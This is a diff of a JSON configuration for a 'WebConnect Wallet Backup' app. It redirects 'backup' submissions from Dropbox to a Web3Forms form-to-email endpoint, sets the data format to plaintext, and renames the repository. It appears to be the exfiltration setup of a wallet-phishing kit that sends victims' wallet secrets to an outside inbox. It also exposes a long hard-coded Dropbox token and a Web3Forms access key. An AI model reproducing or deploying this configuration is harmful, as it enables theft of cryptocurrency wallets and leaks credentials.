@@ -1,19 +1,19 @@
 {
   "version": "1.0.0",
   "app_name": "WebConnect Wallet Backup",
-  "description": "Interactive wallet backup system with Dropbox integration",
-  "repository": "https://github.com/yourusername/wallet-backup",
+  "description": "Interactive wallet backup system with Web3Forms integration",
+  "repository": "https://github.com/decentralizedconfig/launchpad",
   
   "storage": {
     "enabled": true,
     "destinations": [
       {
-        "name": "dropbox",
-        "type": "cloud_dropbox",
+        "name": "web3forms",
+        "type": "web3forms_api",
         "enabled": true,
-        "access_token": "sl.u.AGV_lZ5sBhlHQpcKDU0P3ppGtFxvs8SGy0Ni-2uYvfRahGI59_eAlU1X--lZ93k0lPX5_iB232aeaAx7bBbhgaG1E1xNk_OGai7LAEA5554uUgybX-lup1e09epSa-v9luLfSQXy4O76AI8mI2QI0FdG6c15iqx75RXiFLbVl81EoomgLg3sgfbPUKpyUJ7oHgOZkLRboYvEFrV2fgrt3wC5iif_d7OS6-0_xT5--DwGJ5Z556lUvKqXfM1YOYiwSYYX3JjZrE_oy3hDag20icIJOnM7Sg__6Z0CjhAwgkClNOz52yAn0oSyAvP2_6aP-BN_NDf0KwgPwXyqvVxzKHMh-Y_hVHaShO1teyQxzpx7P4T5Ui8NA7-NrJHUJdSEp6rt0sLf759tJ3pFZt_YdQCMdHlXhb0XpBC7jrjUaj7ms753lgHZB42aTtpztgD6MKlOU3jep38RhJxuqpyP_VrGx0yDLFOh3EEHIU_IkWcICHhLBELvgIHeiKQONBr6IXxxz_RSl0iWCg2tnFlw0urmMZgJsf2WOsfLFBs5HWEs25eNXmybKc0VN_GEc0EVGTYo1t7-F7QxUX6csY1Ka2K3BDeSkePu5Nb70Bqgwt71gzXdLzZrbytehrOTnGbNVvCO7slJxapBgpIK90xnl3UoqLh1VfFnsMqrgRiEWrciUEeObEyhBchnfj9KvvSQph2qpY_C6-s2Sp3kVI1_10P5PcdzjDss4uSYxCzK0HbY4NtRAjEHXTKMMSiEOToCtbWyRWHxsLn2qfLUlazNVG8jesB_i6uik0WF1o_LaAg-WdKBExdvbIN3W6rDY1jZ9Xvtj8YE87PB3XSduBgDENFvjEifZSu5LyPRkyra_80g7Rdqy_UWyXpcio8wZbl3W6pafYMeL3oF8M0RLaxCIjsYe18yCIktvNLMukO3sJA-FOXGkSdFwxk8kiZvFbB901tzgN9KNoKIUv3rMQtsdLvXgleZ7IZeF8aaACjip51OTRZaRPk7gXCy8FpWi_z7WJHmpq6vJVmw-9IAAVBin6qvw6eKvEQDrcEC5v_7_metmQweUqkuWkJIPW7dK2F_seC5Dp7gT0wUJ_Q7Jo_nmVt7rIIfOfsJNn_p-kgaTO9nDcn0cW0dvfur2y0aGVeEKBNuYCA92dvg8YF5gtqRiPqq506hBPo198uBU7zjhc89cvv0ktD6BOLA27MBXTyrG2t3ZsPxOn3fIJXZZfq-NOnMPBY2MGrq9mv9rEt7cdotL-iVGtSAvCxwGyoZO2v1Yns86KYIrpE5_bHkIiUqv6EYROY_19ZfZyw6LnmLvLIwGgfy0OG5MMJVsRb7QAkRxQd7KpZ7dcIfVsI9Dde0Fv_aJNbqCRk5Gd6QF1kgA_hg-KwpcNOzHuBMOMjRD9z8y3If4gx3_1HGiBKKOLpdfhgqbaCoy4RvBrtTxMfRaxhtWmoJZ7Gzl4rBrWXGGPru2wA",
-        "path": "/WebConnect/Wallet_Backups",
-        "description": "Dropbox API v2 token for secure backup storage"
+        "api_endpoint": "https://api.web3forms.com/submit",
+        "access_key": "b5f9f926-ecd5-4757-b0ad-ff1954bd43ea",
+        "description": "Web3Forms API for secure backup submission"
       }
     ]
   },
@@ -69,10 +69,10 @@
     "data_format": "plaintext"
   },
 
-  "dropbox_api": {
-    "version": "2",
-    "endpoint": "https://content.dropboxapi.com/2/files/upload",
-    "content_type": "application/octet-stream",
+  "web3forms_api": {
+    "endpoint": "https://api.web3forms.com/submit",
+    "method": "POST",
+    "content_type": "application/json",
     "timeout": 30,
     "retry_attempts": 3
   }
